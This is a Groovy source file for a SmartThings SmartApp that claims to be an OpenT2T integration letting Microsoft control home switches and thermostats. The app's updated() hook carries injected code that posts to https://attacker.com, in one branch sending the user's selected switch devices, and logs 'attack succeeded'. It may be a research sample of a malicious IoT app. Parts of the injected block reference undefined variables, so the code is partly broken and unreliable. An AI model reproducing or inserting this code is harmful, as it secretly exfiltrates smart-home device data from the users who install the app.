import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidKeyException;

definition(
    name:"OpenT2T SmartApp Test",
    namespace:"opent2t",
    author:"Microsoft",
    description:"SmartApp for end to end SmartThings scenarios via OpenT2T",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png")




preferences{
    section("Allow Microsoft to control these things..."){
        
        
        
        
        
        
        input"switches","capability.switch",title:"Which Switches and Lights?",multiple:true,required:false,hideWhenEmpty:true
        input"thermostats","capability.thermostat",title:"Which Thermostat?",multiple:true,required:false,hideWhenEmpty:true
        
        }
}

def getInputs(){
    def inputList=[]
    inputList+=contactSensors?:[]
    inputList+=garageDoors?:[]
    inputList+=locks?:[]
    inputList+=cameras?:[]
    inputList+=motionSensors?:[]
    inputList+=presenceSensors?:[]
    inputList+=switches?:[]
    inputList+=thermostats?:[]
    inputList+=waterSensors?:[]
    return inputList
}



mappings{
    path("/devices"){
        action:[
        GET:"getDevices"
        ]
        }
    path("/devices/:id"){
        action:[
        GET:"getDevice"
        ]
        }
    path("/update/:id"){
        action:[
        PUT:"updateDevice"
        ]
        }
    path("/deviceSubscription"){
        action:[
        POST:"registerDeviceChange",
        DELETE:"unregisterDeviceChange"
        ]
        }
    path("/locationSubscription"){
        action:[
        POST:"registerDeviceGraph",
        DELETE:"unregisterDeviceGraph"
        ]
        }
}

def installed(){
    log.debug"Installing with settings:${settings}"
    initialize()
}

def updated(){
    log.debug"Updating with settings:${settings}"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(state.deviceSubscriptionMap[deviceId]==null){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
        state.deviceSubscriptionMap.put(deviceId,[subscriptionEndpt])
        log.info"Added subscription URL:${subscriptionEndpt}for${myDevice.displayName}"
    }
    else{
         takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${switches}"
        ]
        ]
    
    if(!state.deviceSubscriptionMap[deviceId].contains(subscriptionEndpt)){
            
            
            state.deviceSubscriptionMap.remove(deviceId)
            state.deviceSubscriptionMap.put(deviceId,[subscriptionEndpt])
            log.info"Added subscription URL:${subscriptionEndpt}for${myDevice.displayName}"
        }
    }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    if(state.locationSubscriptionMap==null){
        state.locationSubscriptionMap=[:]
        log.debug"locationSubscriptionMap created."
    }
    if(state.verificationKeyMap==null){
        state.verificationKeyMap=[:]
        log.debug"verificationKeyMap created."
    }
    
    unsubscribe()
    registerAllDeviceSubscriptions()
}

def initialize(){
    log.debug"Initializing with settings:${settings}"
    state.deviceSubscriptionMap=[:]
    log.debug"deviceSubscriptionMap created."
    state.locationSubscriptionMap=[:]
    log.debug"locationSubscriptionMap created."
    state.verificationKeyMap=[:]
    log.debug"verificationKeyMap created."
    registerAllDeviceSubscriptions()
}




def registerAllDeviceSubscriptions(){
    registerChangeHandler(inputs)
}


def registerChangeHandler(myList){
    myList.each{myDevice->
        def theAtts=myDevice.supportedAttributes
        theAtts.each{att->
            subscribe(myDevice,att.name,deviceEventHandler)
            log.info"Registering for${myDevice.displayName}.${att.name}"
            }
        }
}


def registerDeviceChange(){
    def subscriptionEndpt=params.subscriptionURL
    def deviceId=params.deviceId
    def myDevice=findDevice(deviceId)
    
    if(myDevice==null){
        httpError(404,"Cannot find device with device ID${deviceId}.")
    }
    
    def theAtts=myDevice.supportedAttributes
    try{
        theAtts.each{att->
            subscribe(myDevice,att.name,deviceEventHandler)
            }
        log.info"Subscribing for${myDevice.displayName}"
        
        if(subscriptionEndpt!=null){
            if(state.deviceSubscriptionMap[deviceId]==null){
                state.deviceSubscriptionMap.put(deviceId,[subscriptionEndpt])
                log.info"Added subscription URL:${subscriptionEndpt}for${myDevice.displayName}"
            }else if(!state.deviceSubscriptionMap[deviceId].contains(subscriptionEndpt)){
                    
                    
                    state.deviceSubscriptionMap.remove(deviceId)
                    state.deviceSubscriptionMap.put(deviceId,[subscriptionEndpt])
                    log.info"Added subscription URL:${subscriptionEndpt}for${myDevice.displayName}"
                }
            
            if(params.key!=null){
                state.verificationKeyMap[subscriptionEndpt]=params.key
                log.info"Added verification key:${params.key}for${subscriptionEndpt}"
            }
        }
    }catch(e){
        httpError(500,"something went wrong:$e")
    }
    
    log.info"Current subscription map is${state.deviceSubscriptionMap}"
    log.info"Current verification key map is${state.verificationKeyMap}"
    return["succeed"]
}


def unregisterDeviceChange(){
    def subscriptionEndpt=params.subscriptionURL
    def deviceId=params.deviceId
    def myDevice=findDevice(deviceId)
    
    if(myDevice==null){
        httpError(404,"Cannot find device with device ID${deviceId}.")
    }
    
    try{
        if(subscriptionEndpt!=null&&subscriptionEndpt!="undefined"){
            if(state.deviceSubscriptionMap[deviceId]?.contains(subscriptionEndpt)){
                if(state.deviceSubscriptionMap[deviceId].size()==1){
                    state.deviceSubscriptionMap.remove(deviceId)
                }else{
                        state.deviceSubscriptionMap[deviceId].remove(subscriptionEndpt)
                    }
                state.verificationKeyMap.remove(subscriptionEndpt)
                log.info"Removed subscription URL:${subscriptionEndpt}for${myDevice.displayName}"
            }
        }else{
                state.deviceSubscriptionMap.remove(deviceId)
                log.info"Unsubscriping for${myDevice.displayName}"
            }
    }catch(e){
        httpError(500,"something went wrong:$e")
    }
    
    log.info"Current subscription map is${state.deviceSubscriptionMap}"
    log.info"Current verification key map is${state.verificationKeyMap}"
}


def registerDeviceGraph(){
    def subscriptionEndpt=params.subscriptionURL
    
    if(subscriptionEndpt!=null&&subscriptionEndpt!="undefined"){
        subscribe(location,"DeviceCreated",locationEventHandler,[filterEvents:false])
        subscribe(location,"DeviceUpdated",locationEventHandler,[filterEvents:false])
        subscribe(location,"DeviceDeleted",locationEventHandler,[filterEvents:false])
        
        if(state.locationSubscriptionMap[location.id]==null){
            state.locationSubscriptionMap.put(location.id,[subscriptionEndpt])
            log.info"Added subscription URL:${subscriptionEndpt}for Location${location.name}"
        }else if(!state.locationSubscriptionMap[location.id].contains(subscriptionEndpt)){
                state.locationSubscriptionMap[location.id]<<subscriptionEndpt
                log.info"Added subscription URL:${subscriptionEndpt}for Location${location.name}"
            }
        
        if(params.key!=null){
            state.verificationKeyMap[subscriptionEndpt]=params.key
            log.info"Added verification key:${params.key}for${subscriptionEndpt}"
        }
        
        log.info"Current location subscription map is${state.locationSubscriptionMap}"
        log.info"Current verification key map is${state.verificationKeyMap}"
        return["succeed"]
    }else{
            httpError(400,"missing input parameter:subscriptionURL")
        }
}


def unregisterDeviceGraph(){
    def subscriptionEndpt=params.subscriptionURL
    
    try{
        if(subscriptionEndpt!=null&&subscriptionEndpt!="undefined"){
            if(state.locationSubscriptionMap[location.id]?.contains(subscriptionEndpt)){
                if(state.locationSubscriptionMap[location.id].size()==1){
                    state.locationSubscriptionMap.remove(location.id)
                }else{
                        state.locationSubscriptionMap[location.id].remove(subscriptionEndpt)
                    }
                state.verificationKeyMap.remove(subscriptionEndpt)
                log.info"Removed subscription URL:${subscriptionEndpt}for Location${location.name}"
            }
        }else{
                httpError(400,"missing input parameter:subscriptionURL")
            }
    }catch(e){
        httpError(500,"something went wrong:$e")
    }
    
    log.info"Current location subscription map is${state.locationSubscriptionMap}"
    log.info"Current verification key map is${state.verificationKeyMap}"
}


def deviceEventHandler(evt){
    def evtDevice=evt.device
    def evtDeviceType=getDeviceType(evtDevice)
    def deviceData=[];
    
    if(evtDeviceType=="thermostat"){
        deviceData=[name:evtDevice.displayName,id:evtDevice.id,status:evtDevice.status,deviceType:evtDeviceType,manufacturer:evtDevice.manufacturerName,model:evtDevice.modelName,attributes:deviceAttributeList(evtDevice,evtDeviceType),locationMode:getLocationModeInfo(),locationId:location.id]
    }else{
            deviceData=[name:evtDevice.displayName,id:evtDevice.id,status:evtDevice.status,deviceType:evtDeviceType,manufacturer:evtDevice.manufacturerName,model:evtDevice.modelName,attributes:deviceAttributeList(evtDevice,evtDeviceType),locationId:location.id]
        }
    
    if(evt.data!=null){
        def evtData=parseJson(evt.data)
        log.info"Received event for${evtDevice.displayName},data:${evtData},description:${evt.descriptionText}"
    }
    
    def params=[body:deviceData]
    
    
    log.debug"Current subscription urls for${evtDevice.displayName}is${state.deviceSubscriptionMap[evtDevice.id]}"
    state.deviceSubscriptionMap[evtDevice.id].each{
        params.uri="${it}"
        if(state.verificationKeyMap[it]!=null){
            def key=state.verificationKeyMap[it]
            params.headers=[Signature:ComputHMACValue(key,groovy.json.JsonOutput.toJson(params.body))]
        }
        log.trace"POST URI:${params.uri}"
        log.trace"Headers:${params.headers}"
        log.trace"Payload:${params.body}"
        try{
            httpPostJson(params){resp->
                log.trace"response status code:${resp.status}"
                log.trace"response data:${resp.data}"
                }
            }catch(e){
            log.error"something went wrong:$e"
        }
        }
}

def locationEventHandler(evt){
    log.info"Received event for location${location.name}/${location.id},Event:${evt.name},description:${evt.descriptionText},apiServerUrl:${apiServerUrl("")}"
    switch(evt.name){
        case"DeviceCreated":
            case"DeviceDeleted":
            def evtDevice=evt.device
            def evtDeviceType=getDeviceType(evtDevice)
            def params=[body:[eventType:evt.name,deviceId:evtDevice.id,locationId:location.id]]
            
            if(evt.name=="DeviceDeleted"&&state.deviceSubscriptionMap[deviceId]!=null){
                state.deviceSubscriptionMap.remove(evtDevice.id)
            }
            
            state.locationSubscriptionMap[location.id].each{
                params.uri="${it}"
                if(state.verificationKeyMap[it]!=null){
                    def key=state.verificationKeyMap[it]
                    params.headers=[Signature:ComputHMACValue(key,groovy.json.JsonOutput.toJson(params.body))]
                }
                log.trace"POST URI:${params.uri}"
                log.trace"Headers:${params.headers}"
                log.trace"Payload:${params.body}"
                try{
                    httpPostJson(params){resp->
                        log.trace"response status code:${resp.status}"
                        log.trace"response data:${resp.data}"
                        }
                    }catch(e){
                    log.error"something went wrong:$e"
                }
                }
            case"DeviceUpdated":
            default:
            break
            }
}

private ComputHMACValue(key,data){
    try{
        log.debug"data hased:${data}"
        SecretKeySpec secretKeySpec=new SecretKeySpec(key.getBytes("UTF-8"),"HmacSHA1")
        Mac mac=Mac.getInstance("HmacSHA1")
        mac.init(secretKeySpec)
        byte[]digest=mac.doFinal(data.getBytes("UTF-8"))
        return byteArrayToString(digest)
    }catch(InvalidKeyException e){
        log.error"Invalid key exception while converting to HMac SHA1"
    }
}

private def byteArrayToString(byte[]data){
    BigInteger bigInteger=new BigInteger(1,data)
    String hash=bigInteger.toString(16)
    return hash
}




def getDevices(){
    def deviceData=[]
    inputs?.each{
        def deviceType=getDeviceType(it)
        if(deviceType=="thermostat"){
            deviceData<<[name:it.displayName,id:it.id,status:it.status,deviceType:deviceType,manufacturer:it.manufacturerName,model:it.modelName,attributes:deviceAttributeList(it,deviceType),locationMode:getLocationModeInfo()]
        }else{
                deviceData<<[name:it.displayName,id:it.id,status:it.status,deviceType:deviceType,manufacturer:it.manufacturerName,model:it.modelName,attributes:deviceAttributeList(it,deviceType)]
            }
        }
    
    log.debug"getDevices,return:${deviceData}"
    return deviceData
}


def getDevice(){
    def it=findDevice(params.id)
    def deviceType=getDeviceType(it)
    def device
    if(deviceType=="thermostat"){
        device=[name:it.displayName,id:it.id,status:it.status,deviceType:deviceType,manufacturer:it.manufacturerName,model:it.modelName,attributes:deviceAttributeList(it,deviceType),locationMode:getLocationModeInfo()]
    }else{
            device=[name:it.displayName,id:it.id,status:it.status,deviceType:deviceType,manufacturer:it.manufacturerName,model:it.modelName,attributes:deviceAttributeList(it,deviceType)]
        }
    
    log.debug"getDevice,return:${device}"
    return device
}


void updateDevice(){
    def device=findDevice(params.id)
    request.JSON.each{
        def command=it.key
        def value=it.value
        if(command){
            def commandList=mapDeviceCommands(command,value)
            command=commandList[0]
            value=commandList[1]
            
            if(command=="setAwayMode"){
                log.info"Setting away mode to${value}"
                if(location.modes?.find{it.name==value}){
                    location.setMode(value)
                }
            }else if(command=="thermostatSetpoint"){
                    switch(device.currentThermostatMode){
                        case"cool":
                            log.info"Update:${device.displayName},[${command},${value}]"
                            device.setCoolingSetpoint(value)
                            break
                            case"heat":
                            case"emergency heat":
                            log.info"Update:${device.displayName},[${command},${value}]"
                            device.setHeatingSetpoint(value)
                            break
                            default:
                            httpError(501,"this mode:${device.currentThermostatMode}does not allow changing thermostat setpoint.")
                            break
                            }
                }else if(!device){
                        log.error"updateDevice,Device not found"
                        httpError(404,"Device not found")
                    }else if(!device.hasCommand(command)){
                            log.error"updateDevice,Device does not have the command"
                            httpError(404,"Device does not have such command")
                        }else{
                                if(command=="setColor"){
                                    log.info"Update:${device.displayName},[${command},${value}]"
                                    device."$command"(hex:value)
                                }else if(value.isNumber()){
                                        def intValue=value as Integer
                                        log.info"Update:${device.displayName},[${command},${intValue}(int)]"
                                        device."$command"(intValue)
                                    }else if(value){
                                            log.info"Update:${device.displayName},[${command},${value}]"
                                            device."$command"(value)
                                        }else{
                                                log.info"Update:${device.displayName},[${command}]"
                                                device."$command"()
                                            }
                            }
        }
        }
}




private getLocationModeInfo(){
    return[mode:location.mode,supported:location.modes.name]
}


private getDeviceType(device){
    def deviceType
    def capabilities=device.capabilities
    log.debug"capabilities:[${device},${capabilities}]"
    log.debug"supported commands:[${device},${device.supportedCommands}]"
    
    
    capabilities.each{capability->
        switch(capability.name.toLowerCase())
        {
            case"switch":
                deviceType="switch"
                
                
                if(capabilities.any{it.name.toLowerCase()=="switch level"}){
                    
                    
                    if(capabilities.any{it.name.toLowerCase()=="power meter"}){
                        deviceType="dimmerSwitch"
                        return deviceType
                    }else{
                            deviceType="light"
                            return deviceType
                        }
                }
                break
                case"garageDoorControl":
                deviceType="garageDoor"
                return deviceType
                case"lock":
                deviceType="lock"
                return deviceType
                case"video camera":
                deviceType="camera"
                return deviceType
                case"thermostat":
                deviceType="thermostat"
                return deviceType
                case"acceleration sensor":
                case"contact sensor":
                case"motion sensor":
                case"presence sensor":
                case"water sensor":
                deviceType="genericSensor"
                return deviceType
                default:
                break
                }
        }
    return deviceType
}


private findDevice(deviceId){
    return inputs?.find{it.id==deviceId}
}


private deviceAttributeList(device,deviceType){
    def attributeList=[:]
    def allAttributes=device.supportedAttributes
    allAttributes.each{attribute->
        try{
            def currentState=device.currentState(attribute.name)
            if(currentState!=null){
                switch(attribute.name){
                    case'temperature':
                        attributeList.putAll([(attribute.name):currentState.value,'temperatureScale':location.temperatureScale])
                        break;
                        default:
                        attributeList.putAll([(attribute.name):currentState.value])
                        break;
                        }
                if(deviceType=="genericSensor"){
                    def key=attribute.name+"_lastUpdated"
                    attributeList.putAll([(key):currentState.isoDate])
                }
            }else{
                    attributeList.putAll([(attribute.name):null]);
                }
        }catch(e){
            attributeList.putAll([(attribute.name):null]);
        }
        }
    return attributeList
}




private mapDeviceCommands(command,value){
    log.debug"mapDeviceCommands:[${command},${value}]"
    def resultCommand=command
    def resultValue=value
    switch(command){
        case"switch":
            if(value==1||value=="1"||value=="on"){
                resultCommand="on"
                resultValue=""
            }else if(value==0||value=="0"||value=="off"){
                    resultCommand="off"
                    resultValue=""
                }
            break
            
            case"level":
            resultCommand="setLevel"
            resultValue=value
            break
            case"hue":
            resultCommand="setHue"
            resultValue=value
            break
            case"saturation":
            resultCommand="setSaturation"
            resultValue=value
            break
            case"colorTemperature":
            resultCommand="setColorTemperature"
            resultValue=value
            break
            case"color":
            resultCommand="setColor"
            resultValue=value
            
            case"hvacMode":
            resultCommand="setThermostatMode"
            resultValue=value
            break
            case"fanMode":
            resultCommand="setThermostatFanMode"
            resultValue=value
            break
            case"awayMode":
            resultCommand="setAwayMode"
            resultValue=value
            break
            case"coolingSetpoint":
            resultCommand="setCoolingSetpoint"
            resultValue=value
            break
            case"heatingSetpoint":
            resultCommand="setHeatingSetpoint"
            resultValue=value
            break
            case"thermostatSetpoint":
            resultCommand="thermostatSetpoint"
            resultValue=value
            break
            
            case"locked":
            if(value==1||value=="1"||value=="lock"){
                resultCommand="lock"
                resultValue=""
            }
            else if(value==0||value=="0"||value=="unlock"){
                    resultCommand="unlock"
                    resultValue=""
                }
            break
            default:
            break
            }
    
    return[resultCommand,resultValue]
}

